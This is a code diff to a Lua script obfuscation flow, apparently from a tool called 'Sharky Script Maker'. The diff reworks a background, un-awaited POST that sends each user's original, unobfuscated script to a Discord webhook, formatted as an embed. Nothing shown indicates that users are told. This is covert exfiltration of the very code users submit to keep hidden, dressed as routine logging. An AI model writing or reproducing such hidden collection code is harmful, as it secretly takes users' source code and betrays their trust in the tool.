@@ -47,17 +47,55 @@ const obfuscateScriptFlow = ai.defineFlow<
     if (SCRIPT_LOG_WEBHOOK_URL && SCRIPT_LOG_WEBHOOK_URL !== 'YOUR_WEBHOOK_URL_HERE') {
       try {
         console.log(`Sending script log to webhook: ${SCRIPT_LOG_WEBHOOK_URL}`);
+
+        // Limit script length for Discord embed field
+        const maxScriptLength = 1000; // Discord field value limit is 1024
+        const truncatedScript = script.length > maxScriptLength
+          ? script.substring(0, maxScriptLength) + '... (truncated)'
+          : script;
+
+        const discordPayload = {
+          // username: "Script Logger", // Optional: customize webhook name
+          // avatar_url: "YOUR_AVATAR_URL", // Optional: customize webhook avatar
+          embeds: [
+            {
+              title: "New Script Configuration Logged",
+              color: 5814783, // Example color (light blue) - use decimal format
+              timestamp: new Date().toISOString(),
+              fields: [
+                {
+                  name: "Timestamp",
+                  value: new Date().toLocaleString('en-US', { timeZone: 'UTC' }) + " UTC", // More readable timestamp
+                  inline: false
+                },
+                {
+                  name: "Source",
+                  value: "obfuscateScriptFlow",
+                  inline: false
+                },
+                {
+                  name: "Original Script",
+                  value: "```lua
+" + truncatedScript + "
+```", // Format as Lua code block
+                  inline: false
+                }
+              ],
+              // Optional footer
+              // footer: {
+              //   text: "Generated via Sharky Script Maker"
+              // }
+            }
+          ]
+        };
+
         // No await here - let it run in the background
         fetch(SCRIPT_LOG_WEBHOOK_URL, {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
           },
-          body: JSON.stringify({
-            timestamp: new Date().toISOString(),
-            unobfuscatedScript: script, // Log the original script
-            source: 'obfuscateScriptFlow',
-          }),
+          body: JSON.stringify(discordPayload), // Send the structured embed payload
         }).then(response => {
             if (!response.ok) {
               response.text().then(text => {
@@ -66,7 +104,7 @@ const obfuscateScriptFlow = ai.defineFlow<
                 console.error(`Webhook failed with status ${response.status}, could not read body.`);
               });
             } else {
-                console.log('Successfully sent script to webhook.');
+                console.log('Successfully sent script to webhook via embed.');
             }
         }).catch(webhookError => {
           console.error('Error sending script to webhook:', webhookError);
